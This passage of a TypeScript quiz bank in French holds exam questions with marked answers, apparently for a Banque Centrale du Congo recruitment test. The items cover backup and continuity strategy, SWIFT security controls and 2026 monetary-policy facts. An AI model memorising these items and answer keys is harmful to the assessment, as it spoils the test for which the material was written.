      D: "Le RTO se mesure à partir de l'incident (10h30), pas à partir de la dernière sauvegarde.",
    },
    aRetenir: "RTO = durée d'arrêt depuis l'incident ; RPO = données perdues depuis la dernière sauvegarde.",
  },
  {
    id: 'CYB-PCA-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'PCA & PRA',
    difficulte: 'moyen',
    enonce:
      "Après une attaque par rançongiciel, Banque Gamma constate que ses sauvegardes, stockées sur un NAS joint au domaine et accessible avec les comptes d'administration habituels, ont elles aussi été chiffrées. Quelle stratégie aurait évité cette situation ?",
    options: [
      { id: 'A', texte: "Passer les disques du NAS en RAID 1 pour disposer d'une copie miroir de chaque donnée" },
      { id: 'B', texte: "Multiplier les instantanés (snapshots) sur le même NAS, gérés par le même compte" },
      { id: 'C', texte: "Synchroniser en temps réel les sauvegardes vers un espace de stockage en ligne" },
      { id: 'D', texte: "Appliquer la règle 3-2-1 avec une copie hors ligne ou immuable, et tester les restaurations" },
    ],
    bonneReponse: 'D',
    explication:
      "La règle 3-2-1 prévoit trois copies des données, sur deux supports différents, dont une hors site. Face aux rançongiciels, au moins une copie doit être hors ligne ou immuable (WORM) et administrée par des comptes distincts du domaine. Des tests de restauration réguliers garantissent que ces sauvegardes sont réellement exploitables.",
    pourquoiPas: {
      A: "Le RAID protège contre la panne d'un disque, mais le chiffrement malveillant est répliqué instantanément sur le miroir.",
      B: "Des instantanés gérés par un compte compromis peuvent être supprimés ou chiffrés par l'attaquant.",
      C: "Une synchronisation en temps réel propage aussitôt les fichiers chiffrés vers la copie distante.",
    },
    aRetenir: "3 copies, 2 supports, 1 hors site, dont une hors ligne ou immuable, et des restaurations testées.",
  },
  {
    id: 'CYB-PCA-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'PCA & PRA',
    difficulte: 'difficile',
    enonce:
      "Banque Delta réplique de façon synchrone sa base de compensation vers un site de secours chaud situé à 40 km. Un responsable affirme : « Notre RPO est nul, nous n'avons plus besoin de sauvegardes. » Quelle réponse est la plus juste ?",
    options: [
      { id: 'A', texte: "C'est exact : la réplication synchrone garantit un RPO nul dans tous les scénarios" },
      { id: 'B', texte: "C'est exact, à condition de passer en réplication asynchrone pour éviter la latence" },
      { id: 'C', texte: "C'est faux : la réplication propage aussi les corruptions et chiffrements, les sauvegardes restent nécessaires" },
      { id: 'D', texte: "C'est faux, car un site de secours chaud ne peut jamais reprendre en moins de 24 heures" },
    ],
    bonneReponse: 'C',
    explication:
      "La réplication synchrone offre un RPO quasi nul face à la perte physique du site principal, mais elle recopie instantanément toute suppression, corruption logique ou chiffrement malveillant. Seules des sauvegardes versionnées, isolées et testées permettent de revenir à un état sain antérieur. Les bascules vers le site de secours doivent en outre être testées régulièrement pour valider le RTO réel.",
    pourquoiPas: {
      A: "Le RPO nul ne vaut que pour une panne d'infrastructure ; en cas de corruption ou de rançongiciel, l'état répliqué est lui aussi inutilisable.",
      B: "La réplication asynchrone introduit un RPO non nul et réplique tout autant les corruptions : elle ne remplace pas les sauvegardes.",
      D: "Un site chaud est précisément conçu pour reprendre en quelques minutes ou heures ; c'est un site froid qui demande des délais longs.",
    },
    aRetenir: "La réplication protège contre la perte d'un site, pas contre la corruption : elle ne remplace jamais la sauvegarde.",
  },

  // ─────────────────────── Messagerie financière (SWIFT) ───────────────────────
  {
    id: 'CYB-SWF-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Messagerie financière (SWIFT)',
    difficulte: 'facile',
    enonce:
      "Banque Beta se connecte au réseau SWIFT. Qu'implique pour elle le Customer Security Programme (CSP) de SWIFT ?",
    options: [
      { id: 'A', texte: "SWIFT prend en charge la sécurité de l'ensemble de l'infrastructure locale de la banque" },
      { id: 'B', texte: "Respecter un référentiel de contrôles (CSCF), dont certains obligatoires, et attester chaque année" },
      { id: 'C', texte: "Installer un antivirus agréé sur les postes opérateurs, sans autre exigence" },
      { id: 'D', texte: "Obtenir une fois pour toutes une certification ISO 27001 qui dispense de toute attestation" },
    ],
    bonneReponse: 'B',
    explication:
      "Lancé en 2016, le CSP repose sur le principe que chaque utilisateur est responsable de la sécurité de son environnement local. Le Customer Security Controls Framework (CSCF) définit des contrôles obligatoires et recommandés, et chaque utilisateur doit attester annuellement de sa conformité, attestation qui doit être étayée par une évaluation indépendante. Les contreparties peuvent consulter ces attestations pour gérer leur risque.",
    pourquoiPas: {
      A: "SWIFT sécurise son réseau, mais chaque utilisateur reste responsable de la protection de son environnement local.",
      C: "Le CSCF couvre de nombreux domaines (segmentation, gestion des accès, MFA, surveillance), bien au-delà d'un antivirus.",
      D: "Une certification ISO 27001 ne remplace pas l'attestation annuelle spécifique au CSCF.",
    },
    aRetenir: "CSP : chaque banque sécurise son environnement SWIFT selon le CSCF et l'atteste chaque année.",
  },
  {
    id: 'CYB-SWF-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Messagerie financière (SWIFT)',
    difficulte: 'moyen',
    enonce:
      "Un exercice de Banque Epsilon s'inspire du braquage de la Banque du Bangladesh (2016). Quel contrôle aurait permis de détecter le plus rapidement ce type de fraude ?",
    extrait: {
      langage: 'texte',
      contenu: `Scénario d'exercice :
- Les attaquants utilisent des identifiants d'opérateurs SWIFT dérobés.
- Ils émettent des ordres de paiement frauduleux hors des heures ouvrées.
- Un logiciel malveillant altère l'interface locale pour masquer les confirmations
  et empêcher l'impression des messages reçus.`,
    },
    options: [
      { id: 'A', texte: "Un rapprochement indépendant des messages émis avec les relevés du correspondant et la comptabilité" },
      { id: 'B', texte: "Une maintenance renforcée de l'imprimante chargée d'éditer les confirmations SWIFT" },
      { id: 'C', texte: "Un contrôle quotidien des confirmations affichées par l'interface SWIFT locale" },
      { id: 'D', texte: "Un changement annuel du mot de passe des opérateurs SWIFT" },
    ],
    bonneReponse: 'A',
    explication:
      "Les attaquants avaient compromis l'environnement local, y compris les moyens de contrôle (affichage et impression des confirmations). Seul un rapprochement réalisé à partir d'une source indépendante du poste compromis (relevés du correspondant, système comptable, flux de confirmations distinct) révèle les écarts. Il doit être fréquent pour permettre d'agir avant le règlement définitif des fonds.",
    pourquoiPas: {
      B: "Le problème n'était pas matériel : c'est le logiciel malveillant qui empêchait l'impression des messages.",
      C: "Se fier à l'interface locale revient à faire confiance aux données que l'attaquant a précisément manipulées.",
      D: "Les attaquants utilisaient des identifiants valides ; une rotation annuelle n'aurait ni empêché ni détecté la fraude.",
    },
    aRetenir: "Un contrôle n'est fiable que s'il s'appuie sur une source que l'attaquant ne contrôle pas.",
  },
  {
    id: 'CYB-SWF-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Messagerie financière (SWIFT)',
    difficulte: 'difficile',
    enonce:
      "Un audit de l'environnement SWIFT de Banque Alpha relève les constats ci-dessous. Quelle mesure prioritaire est la plus conforme à l'esprit du CSCF ?",
    extrait: {
      langage: 'texte',
      contenu: `- Poste opérateur SWIFT sur le VLAN bureautique, avec messagerie et navigation Internet
- Connexion à l'interface de messagerie : identifiant + mot de passe
- Comptes administrateurs partagés entre trois ingénieurs
- Serveur d'interface SWIFT joignable depuis tout le réseau interne`,
    },
    options: [
      { id: 'A', texte: "Renforcer l'antivirus des postes opérateurs en conservant l'architecture actuelle" },
      { id: 'B', texte: "Ouvrir l'interface SWIFT sur Internet via un VPN protégé par mot de passe" },
      { id: 'C', texte: "Créer une zone sécurisée isolée, avec postes dédiés ou rebond, MFA et comptes nominatifs" },
      { id: 'D', texte: "Placer le serveur d'interface SWIFT en DMZ pour faciliter sa supervision" },
    ],
    bonneReponse: 'C',
    explication:
      "Le CSCF demande de protéger l'environnement SWIFT dans une zone sécurisée séparée du reste du réseau, avec des flux strictement limités et des postes opérateurs dédiés ou un accès par serveur de rebond. L'authentification multifacteur, des comptes nominatifs et le moindre privilège réduisent le risque de vol d'identifiants, vecteur central de l'affaire de la Banque du Bangladesh.",
    pourquoiPas: {
      A: "Un antivirus ne compense ni l'exposition du poste à Internet et à la messagerie, ni l'absence de segmentation et de MFA.",
      B: "Exposer l'interface sur Internet avec un simple mot de passe élargit la surface d'attaque au lieu de la réduire.",
      D: "La DMZ est destinée aux services exposés ; l'interface SWIFT doit au contraire être isolée dans une zone sécurisée dédiée.",
    },
    aRetenir: "SWIFT : zone sécurisée isolée, postes dédiés, MFA et comptes nominatifs à moindre privilège.",
  },
];

// ===========================================================================
// CULTURE BCC (commune) — uniquement à partir de src/data/bccFacts.ts
// ===========================================================================

const banqueBcc: QcmQuestion[] = [
  // ---------------------------------------------------------------------------
  // Cadre légal & institution (BCC-001 à BCC-006)
  // ---------------------------------------------------------------------------
  {
    id: 'BCC-001',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Cadre légal & institution',
    difficulte: 'facile',
    enonce: "Selon la loi n°005/2002, quel est l'objectif principal de la politique monétaire de la BCC ?",
    options: [
      { id: 'A', texte: 'Maximiser les réserves de change' },
      { id: 'B', texte: 'Assurer la stabilité du niveau général des prix' },
      { id: 'C', texte: "Financer le déficit budgétaire de l'État" },
      { id: 'D', texte: 'Fixer les taux débiteurs des banques commerciales' },
    ],
    bonneReponse: 'B',
    explication:
      "La loi fixe la stabilité du niveau général des prix comme objectif principal ; le soutien à la politique économique du Gouvernement vient sans préjudice de cet objectif. Les banques fixent elles-mêmes leurs taux débiteurs.",
    pourquoiPas: {
      A: "Les réserves de change ne sont pas l'objectif principal fixé par la loi : c'est la stabilité du niveau général des prix.",
      C: "Financer le déficit budgétaire n'est pas l'objectif de la politique monétaire ; la BCC ne soutient la politique du Gouvernement que sans préjudice de la stabilité des prix.",
      D: 'Les taux débiteurs sont fixés par les banques commerciales elles-mêmes, pas par la BCC.',
    },
    aRetenir: "Objectif principal de la BCC (loi n°005/2002, art. 3) : la stabilité du niveau général des prix.",
    source: 'Loi n°005/2002 du 7 mai 2002, art. 3',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-002',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Cadre légal & institution',
    difficulte: 'facile',
    enonce: 'Quelle institution est seule habilitée à émettre les billets et pièces en franc congolais (CDF) ?',
    options: [
      { id: 'A', texte: 'Le ministère des Finances' },
      { id: 'B', texte: 'Le Trésor public' },
      { id: 'C', texte: 'Les banques commerciales agréées' },
      { id: 'D', texte: 'La Banque Centrale du Congo' },
    ],
    bonneReponse: 'D',
    explication:
      "La BCC est l'institut d'émission de la RDC : elle est seule habilitée à émettre les billets et pièces en franc congolais. Ce monopole d'émission est la base de son rôle de banque centrale et de sa responsabilité sur la monnaie nationale.",
    pourquoiPas: {
      A: "Le ministère des Finances n'est pas l'institut d'émission : ce rôle revient exclusivement à la BCC.",
      B: "Le Trésor public n'émet pas les billets et pièces en CDF ; seule la BCC en a le pouvoir.",
      C: "Les banques commerciales distribuent la monnaie mais ne l'émettent pas ; l'émission est un monopole de la BCC.",
    },
    aRetenir: "La BCC est l'institut d'émission : elle seule émet billets et pièces en franc congolais.",
    source: 'Constitution de la RDC, art. 176 ; Loi n°005/2002',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-003',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Cadre légal & institution',
    difficulte: 'moyen',
    enonce: "Quel est l'objet de la loi n°005/2002 du 7 mai 2002 ?",
    options: [
      { id: 'A', texte: "La constitution, l'organisation et le fonctionnement de la BCC" },
      { id: 'B', texte: 'Le cadre applicable aux émetteurs de monnaie électronique' },
      { id: 'C', texte: "L'interopérabilité obligatoire des paiements électroniques" },
      { id: 'D', texte: 'La prévention et la centralisation des incidents de paiement' },
    ],
    bonneReponse: 'A',
    explication:
      "La loi n°005/2002 du 7 mai 2002 est relative à la constitution, à l'organisation et au fonctionnement de la BCC. C'est le texte fondateur à citer pour toute question sur les missions et le statut de l'institution.",
    pourquoiPas: {
      B: "Le cadre des émetteurs de monnaie électronique relève de l'Instruction n°24, pas de la loi n°005/2002.",
      C: "L'interopérabilité obligatoire des paiements électroniques est imposée par l'Instruction n°58 (2024).",
      D: "La prévention et la centralisation des incidents de paiement relèvent de l'Instruction n°52 (2023).",
    },
    aRetenir: "Loi n°005/2002 du 7 mai 2002 = constitution, organisation et fonctionnement de la BCC.",
    source: 'Loi n°005/2002 du 7 mai 2002 (leganet.cd)',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-004',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Cadre légal & institution',
    difficulte: 'moyen',
    enonce: "Selon l'article 176 de la Constitution, quel statut est reconnu à la BCC ?",
    options: [
      { id: 'A', texte: 'Une direction rattachée au ministère des Finances' },
      { id: 'B', texte: 'Une société détenue par les banques commerciales' },
      { id: 'C', texte: "Une institution indépendante dotée de l'autonomie de gestion" },
      { id: 'D', texte: 'Un organe consultatif dépourvu de pouvoir de décision' },
    ],
    bonneReponse: 'C',
    explication:
      "L'article 176 de la Constitution dispose que la BCC est indépendante et jouit de l'autonomie de gestion. Cette indépendance protège la conduite de la politique monétaire, dont l'objectif principal est la stabilité des prix.",
    pourquoiPas: {
      A: "La BCC n'est pas une direction ministérielle : la Constitution lui reconnaît l'indépendance et l'autonomie de gestion.",
      B: "Le capital de la BCC est détenu en totalité par l'État congolais, pas par les banques commerciales.",
      D: "La BCC décide de sa politique monétaire (par exemple le taux directeur via le CPM) ; ce n'est pas un simple organe consultatif.",
    },
    aRetenir: "Constitution, art. 176 : la BCC est indépendante et jouit de l'autonomie de gestion.",
    source: 'Constitution de la RDC, art. 176',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-005',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Cadre légal & institution',
    difficulte: 'facile',
    enonce: 'Qui détient le capital de la BCC ?',
    options: [
      { id: 'A', texte: "L'État congolais, en totalité" },
      { id: 'B', texte: 'Les banques commerciales, à parts égales' },
      { id: 'C', texte: "L'État et des actionnaires privés" },
      { id: 'D', texte: 'Des institutions financières étrangères' },
    ],
    bonneReponse: 'A',
    explication:
      "Le capital de la BCC est détenu en totalité par l'État congolais. Ce caractère entièrement public n'enlève rien à son indépendance et à son autonomie de gestion, garanties par la Constitution.",
    pourquoiPas: {
      B: "Les banques commerciales ne détiennent aucune part du capital : il appartient en totalité à l'État.",
      C: "Il n'y a pas d'actionnaires privés : le capital est détenu à 100 % par l'État congolais.",
      D: "Aucune institution étrangère ne détient le capital de la BCC, qui est entièrement détenu par l'État.",
    },
    aRetenir: "Capital de la BCC : 100 % détenu par l'État congolais.",
    source: 'Loi n°005/2002 du 7 mai 2002',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-006',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Cadre légal & institution',
    difficulte: 'difficile',
    enonce:
      "La loi n°005/2002 prévoit que la BCC soutient la politique économique du Gouvernement « sans préjudice » de son objectif principal. Que signifie concrètement cette formule ?",
    options: [
      { id: 'A', texte: 'Le soutien au Gouvernement prime sur la stabilité des prix' },
      { id: 'B', texte: 'Les deux objectifs ont exactement le même rang juridique' },
      { id: 'C', texte: 'La BCC doit financer toute dépense publique prioritaire' },
      { id: 'D', texte: 'Ce soutien ne peut pas compromettre la stabilité des prix' },
    ],
    bonneReponse: 'D',
    explication:
      "« Sans préjudice de » signifie « sans porter atteinte à » : la stabilité du niveau général des prix reste l'objectif principal, et le soutien à la politique économique du Gouvernement lui est subordonné. Un futur agent doit savoir que, en cas de tension entre les deux, c'est la stabilité des prix qui prime.",
    pourquoiPas: {
      A: "C'est l'inverse : l'objectif principal est la stabilité des prix, le soutien au Gouvernement vient ensuite.",
      B: "La loi hiérarchise clairement les objectifs : la stabilité des prix est qualifiée d'objectif principal.",
      C: "Financer toute dépense publique pourrait compromettre la stabilité des prix, ce que la formule exclut précisément.",
    },
    aRetenir: "Soutien au Gouvernement : oui, mais jamais au détriment de la stabilité des prix.",
    source: 'Loi n°005/2002 du 7 mai 2002, art. 3',
    verifieLe: VERIFIE_LE,
  },

  // ---------------------------------------------------------------------------
  // Gouvernance & actualité (BCC-007 à BCC-011)
  // ---------------------------------------------------------------------------
  {
    id: 'BCC-007',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Gouvernance & actualité',
    difficulte: 'moyen',
    enonce: 'À quelle date André Wameso Nkualoloki a-t-il été nommé gouverneur de la BCC par ordonnance ?',
    options: [
      { id: 'A', texte: 'Le 30 juin 2026' },
      { id: 'B', texte: 'Le 1er octobre 2026' },
      { id: 'C', texte: 'Le 23 juillet 2025' },
      { id: 'D', texte: 'Le 9 avril 2026' },
    ],
    bonneReponse: 'C',
    explication:
      "André Wameso Nkualoloki a été nommé gouverneur par ordonnance le 23 juillet 2025, puis installé en août 2025 ; il a succédé à Malangu Kabedi Mbuyi. Connaître le calendrier de la gouvernance aide à situer les décisions récentes de l'institution.",
    pourquoiPas: {
      A: "Le 30 juin 2026 correspond aux premiers billets portant la signature du gouverneur Wameso, pas à sa nomination.",
      B: "Le 1er octobre 2026 est la date d'ouverture de la CONFEP 2026 à Kolwezi.",
      D: 'Le 9 avril 2026 est la date du CPM qui a abaissé le taux directeur de 15 % à 13,5 %.',
    },
    aRetenir: 'Gouverneur Wameso : nommé le 23 juillet 2025, installé en août 2025.',
    source: 'Radio Okapi ; 7sur7.cd ; mediacongo.net',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-008',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Gouvernance & actualité',
    difficulte: 'moyen',
    enonce: 'Qui compose le Comité de Politique Monétaire (CPM) de la BCC ?',
    options: [
      { id: 'A', texte: 'Le gouverneur et les dirigeants des banques commerciales' },
      { id: 'B', texte: 'Le gouverneur, les vice-gouverneurs et les administrateurs' },
      { id: 'C', texte: 'Le ministre des Finances et le gouverneur uniquement' },
      { id: 'D', texte: 'Les représentants des entités provinciales de la BCC' },
    ],
    bonneReponse: 'B',
    explication:
      "Le CPM réunit le gouverneur, les vice-gouverneurs et les administrateurs, et se réunit selon un calendrier préétabli. C'est lors de ses réunions que sont annoncées les décisions sur le taux directeur, comme en avril, juillet et octobre 2026.",
    pourquoiPas: {
      A: 'Les dirigeants des banques commerciales ne siègent pas au CPM, organe interne de la BCC.',
      C: "Le ministre des Finances ne fait pas partie du CPM, composé des dirigeants et administrateurs de la BCC.",
      D: "Les entités provinciales se réunissent dans le cadre de la CONFEP, qui est distincte du CPM.",
    },
    aRetenir: 'CPM = gouverneur + vice-gouverneurs + administrateurs, selon un calendrier préétabli.',
    source: 'Communiqué BCC (via capmad.com)',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-009',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Gouvernance & actualité',
    difficulte: 'facile',
    enonce:
      "Où s'est ouverte, le 1er octobre 2026, la 1ère Conférence des Entités Provinciales (CONFEP 2026) de la BCC ?",
    options: [
      { id: 'A', texte: 'À Kolwezi, dans le Lualaba' },
      { id: 'B', texte: 'À Kinshasa, dans la commune de la Gombe' },
      { id: 'C', texte: 'À Lubumbashi, dans le Haut-Katanga' },
      { id: 'D', texte: 'À Goma, dans le Nord-Kivu' },
    ],
    bonneReponse: 'A',
    explication:
      "La 1ère CONFEP s'est ouverte à Kolwezi (Lualaba) le 1er octobre 2026, dans le contexte du plan stratégique 2026-2030 de la BCC. Le CPM du 8 octobre 2026 s'est d'ailleurs tenu dans la même ville.",
    pourquoiPas: {
      B: "Kinshasa (Gombe) accueille le siège de la BCC, mais la CONFEP 2026 s'est ouverte à Kolwezi.",
      C: "Lubumbashi n'est pas la ville retenue : la CONFEP 2026 s'est tenue à Kolwezi.",
      D: "Goma n'est pas la ville retenue : la CONFEP 2026 s'est tenue à Kolwezi.",
    },
    aRetenir: 'CONFEP 2026 : Kolwezi (Lualaba), ouverture le 1er octobre 2026.',
    source: 'Agence Congolaise de Presse (ACP)',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-010',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Gouvernance & actualité',
    difficulte: 'difficile',
    enonce: 'En mai 2026, à Dakar, sur quel risque le RSSI de la BCC a-t-il publiquement alerté ?',
    options: [
      { id: 'A', texte: 'La raréfaction des billets en franc congolais dans les provinces' },
      { id: 'B', texte: "Une remontée rapide du taux directeur d'ici la fin de 2026" },
      { id: 'C', texte: 'La saturation technique du switch monétique national Mosolo' },
      { id: 'D', texte: "L'impréparation du secteur financier face aux cyberattaques dopées à l'IA" },
    ],
    bonneReponse: 'D',
    explication:
      "Le poste de RSSI (responsable de la sécurité des systèmes d'information) a été créé par le gouverneur après sa prise de fonction en 2025. En mai 2026, à Dakar, le RSSI a alerté sur l'impréparation du secteur financier face aux cyberattaques dopées à l'IA : un signal fort de la priorité donnée à la cybersécurité, domaine du recrutement 2026.",
    pourquoiPas: {
      A: "L'alerte du RSSI portait sur la cybersécurité, pas sur la circulation des billets.",
      B: "Le taux directeur relève du CPM et non du RSSI ; il a d'ailleurs baissé en 2026.",
      C: "L'alerte ne visait pas une saturation de Mosolo, mais l'impréparation face aux cyberattaques dopées à l'IA.",
    },
    aRetenir: "RSSI de la BCC (poste créé en 2025) : alerte de mai 2026 sur les cyberattaques dopées à l'IA.",
    source: 'Bankable.africa',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-011',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Gouvernance & actualité',
    difficulte: 'moyen',
    enonce:
      'Le 30 juin 2026, quelles coupures ont été les premières à porter la signature du gouverneur Wameso ?',
    options: [
      { id: 'A', texte: 'Les billets de 5 000, 10 000 et 20 000 CDF' },
      { id: 'B', texte: 'Les billets de 200 et 500 CDF uniquement' },
      { id: 'C', texte: 'Les billets de 50, 100 et 1 000 CDF' },
      { id: 'D', texte: 'Les pièces de 1, 5 et 10 CDF' },
    ],
    bonneReponse: 'C',
    explication:
      "Le 30 juin 2026 marque l'arrivée des premiers billets de 50, 100 et 1 000 CDF portant la signature du gouverneur Wameso. La signature du gouverneur sur les billets matérialise le rôle d'institut d'émission de la BCC.",
    pourquoiPas: {
      A: "Ces coupures ne figurent pas parmi les premiers billets signés par le gouverneur Wameso le 30 juin 2026.",
      B: "Les premiers billets signés Wameso sont ceux de 50, 100 et 1 000 CDF, pas ceux de 200 et 500 CDF.",
      D: "L'événement du 30 juin 2026 concerne des billets (50, 100 et 1 000 CDF), pas des pièces.",
    },
    aRetenir: '30 juin 2026 : premiers billets de 50, 100 et 1 000 CDF signés par le gouverneur Wameso.',
    source: 'mediacongo.net',
    verifieLe: VERIFIE_LE,
  },

  // ---------------------------------------------------------------------------
  // Politique monétaire (BCC-012 à BCC-017)
  // ---------------------------------------------------------------------------
  {
    id: 'BCC-012',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Politique monétaire',
    difficulte: 'facile',
    enonce:
      'Quelle décision le CPM du 8 octobre 2026, tenu à Kolwezi, a-t-il prise concernant le taux directeur ?',
    options: [
      { id: 'A', texte: 'Une baisse à 11,5 %' },
      { id: 'B', texte: 'Un maintien à 12,5 %' },
      { id: 'C', texte: 'Une hausse à 13,5 %' },
      { id: 'D', texte: 'Un retour à 15 %' },
    ],
    bonneReponse: 'B',
    explication:
      "Le CPM du 8 octobre 2026, tenu à Kolwezi, a maintenu le taux directeur à 12,5 %, niveau atteint le 17 juillet 2026. C'est le taux en vigueur au 29 octobre 2026 : un chiffre à connaître par cœur le jour du test.",
    pourquoiPas: {
      A: "Aucune baisse à 11,5 % n'a eu lieu : le CPM d'octobre a maintenu le taux à 12,5 %.",
      C: "13,5 % est le niveau fixé le 9 avril 2026, abandonné dès le 17 juillet ; il n'y a pas eu de hausse en octobre.",
      D: '15 % est le niveau de début 2026, avant les deux baisses successives.',
    },
    aRetenir: 'Taux directeur au 29 octobre 2026 : 12,5 % (maintenu par le CPM du 8 octobre à Kolwezi).',
    source: 'ACP ; Financial Afrik',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-013',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Politique monétaire',
    difficulte: 'difficile',
    enonce:
      "Le taux directeur de la BCC était de 15 % début 2026. De combien de points de base a-t-il baissé au total à l'issue du CPM du 8 octobre 2026 ?",
    options: [
      { id: 'A', texte: '250 points de base' },
      { id: 'B', texte: '150 points de base' },
      { id: 'C', texte: '100 points de base' },
      { id: 'D', texte: '350 points de base' },
    ],
    bonneReponse: 'A',
    explication:
      "Le taux est passé de 15 % à 13,5 % le 9 avril (−150 pb), puis à 12,5 % le 17 juillet (−100 pb), avant d'être maintenu le 8 octobre. Baisse cumulée : 15 % − 12,5 % = 2,5 points, soit 250 points de base (1 point de base = 0,01 point de pourcentage).",
    pourquoiPas: {
      B: "150 pb correspond à la seule baisse du 9 avril 2026 (15 % → 13,5 %).",
      C: '100 pb correspond à la seule baisse du 17 juillet 2026 (13,5 % → 12,5 %).',
      D: '350 pb mènerait le taux à 11,5 %, niveau qui n’a pas été atteint en 2026.',
    },
    aRetenir: '2026 : 15 % → 13,5 % → 12,5 %, soit 250 points de base de baisse cumulée.',
    source: 'ACP ; Financial Afrik',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-014',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Politique monétaire',
    difficulte: 'moyen',
    enonce:
      'Lors du CPM du 17 juillet 2026, le taux directeur passe à 12,5 %. À quel niveau est alors fixée la facilité de prêt marginal ?',
    options: [
      { id: 'A', texte: '12,5 %' },
      { id: 'B', texte: '13,5 %' },
      { id: 'C', texte: '17,5 %' },
      { id: 'D', texte: '16,5 %' },
    ],
    bonneReponse: 'D',
    explication:
      "Le 17 juillet 2026, la facilité de prêt marginal passe de 17,5 % à 16,5 %, en même temps que le taux directeur baisse de 13,5 % à 12,5 %. Elle reste ainsi 4 points au-dessus du taux directeur : les deux taux ont baissé de 100 points de base.",
    pourquoiPas: {
      A: "12,5 % est le nouveau taux directeur, pas le taux de la facilité de prêt marginal.",
      B: "13,5 % est l'ancien taux directeur (fixé le 9 avril 2026).",
      C: '17,5 % est le niveau de la facilité de prêt marginal avant le CPM du 17 juillet 2026.',
    },
    aRetenir: 'Depuis le 17 juillet 2026 : taux directeur 12,5 %, facilité de prêt marginal 16,5 %.',
    source: 'ACP ; Financial Afrik',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-015',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Politique monétaire',
    difficulte: 'moyen',
    enonce:
      'En juillet 2026, la BCC a introduit une nouvelle maturité de 252 jours pour ses Bons BCC. Quel est le but de cet instrument ?',
    options: [
      { id: 'A', texte: "Financer le déficit budgétaire de l'État" },
      { id: 'B', texte: 'Injecter des liquidités dans les banques' },
      { id: 'C', texte: 'Stériliser la liquidité excédentaire' },
      { id: 'D', texte: 'Remplacer le taux directeur' },
    ],
    bonneReponse: 'C',
    explication:
      "Les Bons BCC à 252 jours sont destinés à stériliser la liquidité excédentaire. En souscrivant ces bons, les banques placent leur trésorerie auprès de la BCC : cette liquidité est retirée du circuit pendant la durée du bon, ce qui limite les pressions inflationnistes.",
    pourquoiPas: {
      A: "Les Bons BCC sont un instrument de politique monétaire, pas un outil de financement du déficit de l'État.",
      B: "C'est l'effet inverse : émettre des Bons BCC absorbe des liquidités au lieu d'en injecter.",
      D: "Le taux directeur reste l'instrument de référence, fixé par le CPM ; les Bons BCC le complètent.",
    },
    aRetenir: 'Bons BCC à 252 jours (juillet 2026) = stérilisation de la liquidité excédentaire.',
    source: 'Financial Afrik',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-016',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Politique monétaire',
    difficulte: 'facile',
    enonce: "Quelle est la cible d'inflation moyenne retenue en avril 2026 en Conseil des ministres ?",
    options: [
      { id: 'A', texte: '12,5 %' },
      { id: 'B', texte: '7 %' },
      { id: 'C', texte: '15 %' },
      { id: 'D', texte: '2 %' },
    ],
    bonneReponse: 'B',
    explication:
      "La cible d'inflation moyenne est fixée à 7 %. Elle traduit concrètement l'objectif principal de la BCC, la stabilité du niveau général des prix, et sert de repère aux décisions du CPM.",
    pourquoiPas: {
      A: "12,5 % est le niveau du taux directeur depuis le 17 juillet 2026, pas la cible d'inflation.",
      C: "15 % est le niveau du taux directeur au début de 2026, pas la cible d'inflation.",
      D: "2 % n'est pas la cible retenue : la cible d'inflation moyenne est de 7 %.",
    },
    aRetenir: "Cible d'inflation moyenne : 7 % (à ne pas confondre avec le taux directeur de 12,5 %).",
    source: 'ACP (Conseil des ministres, avril 2026)',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-017',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Politique monétaire',
    difficulte: 'moyen',
    enonce:
      'Le 9 avril 2026, le CPM abaisse le taux directeur de 15 % à 13,5 %. Comment qualifier cette décision ?',
    options: [
      { id: 'A', texte: 'Un assouplissement de 150 points de base' },
      { id: 'B', texte: 'Un resserrement de 150 points de base' },
      { id: 'C', texte: 'Un assouplissement de 15 points de base' },
      { id: 'D', texte: 'Un assouplissement de 1 500 points de base' },
    ],
    bonneReponse: 'A',
    explication:
      "Baisser le taux directeur rend le refinancement des banques moins coûteux : c'est un assouplissement de la politique monétaire. L'écart de 1,5 point de pourcentage (15 % − 13,5 %) correspond à 150 points de base, puisque 1 point de base vaut 0,01 point.",
    pourquoiPas: {
      B: 'Un resserrement correspondrait à une hausse du taux directeur, pas à une baisse.',
      C: '15 points de base ne représentent que 0,15 point ; la baisse réelle est de 1,5 point, soit 150 pb.',
      D: '1 500 points de base représenteraient 15 points de pourcentage, soit dix fois la baisse réelle.',
    },
    aRetenir: 'Baisse du taux directeur = assouplissement ; 1 point de pourcentage = 100 points de base.',
    source: 'ACP ; Financial Afrik',
